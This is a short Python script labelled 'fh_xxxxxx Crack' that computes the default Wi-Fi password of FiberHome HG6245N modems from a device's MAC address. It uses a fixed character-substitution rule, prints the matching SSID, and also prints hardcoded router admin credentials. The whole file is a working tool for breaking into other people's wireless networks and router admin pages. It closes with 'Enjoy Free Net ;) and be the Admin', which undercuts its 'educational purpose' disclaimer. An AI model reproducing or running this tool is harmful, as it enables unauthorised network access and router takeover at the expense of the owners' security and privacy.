# This code is for educational purpose!!!
# I am not resposible, use it at your own
# (c) All rights reserved to @y053f01

def generate_password(mac_address):
    # Transformation rules
    transformation = {
      'A': '5',
      'B': '4',
      'C': '3',
      'D': '2',
      'E': '1',
      'F': '0',
      '8': '7',
      '9': '6',
      '6': '9',
      '5': 'A',
      '4': 'B',
      '3': 'C',
      '2': 'D',
      '1': 'E',
      '0': 'F',
      '7': '8'}

    # Extract the last three parts of the MAC address
    parts = mac_address.split(':')
    last_three_parts = ''.join(parts[-3:]).upper()

    # Apply reverse transformation rules to the last three parts
    transformed_parts = ''.join(transformation.get(char, char) for char in last_three_parts)

    # Generate the password
    password = 'wlan' + transformed_parts.lower()
    return password

def main():
    # Prompt the user to enter the MAC address
    print(f"""

   This code is for educational purpose!!!
   I am not resposible, use it at your own risk!!!


   ###### fh_xxxxxx Crack #########
   #     Developer: @y053f01      #
   #     Version: 1.1             #
   #     Target: FiberHome Modem  #
   #     Modem version: HG6245N   #
   #    (c) All rights reserved   #
   ################################
""")
    mac_address = input("Enter the MAC address: ").upper()

    # Check if the first three parts of the MAC address match a specific pattern
    if mac_address[:8] != '6C:A5:D1':
        print("Can't generate the password, it not fh_xxxxxx FiberHome modem :(")
    else:
        # Generate the SSID
        ssid = 'fh_' + ''.join(mac_address.split(':')[3:]).upper()

        # Generate the password
        password = generate_password(mac_address)

        # Print the MAC address, SSID, and password in lowercase
        print("MAC Address:", mac_address.lower())
        print("SSID:", ssid.lower())
        print("Password:", password.lower())
        print("Admin Web: http://192.168.1.1")
        print("Admin Username: User_OT_FH")
        print("Admin Password: User@1234_FH")
        print("\n Enjoy Free Net ;) and be the Admin :)")

if __name__ == "__main__":
    main()
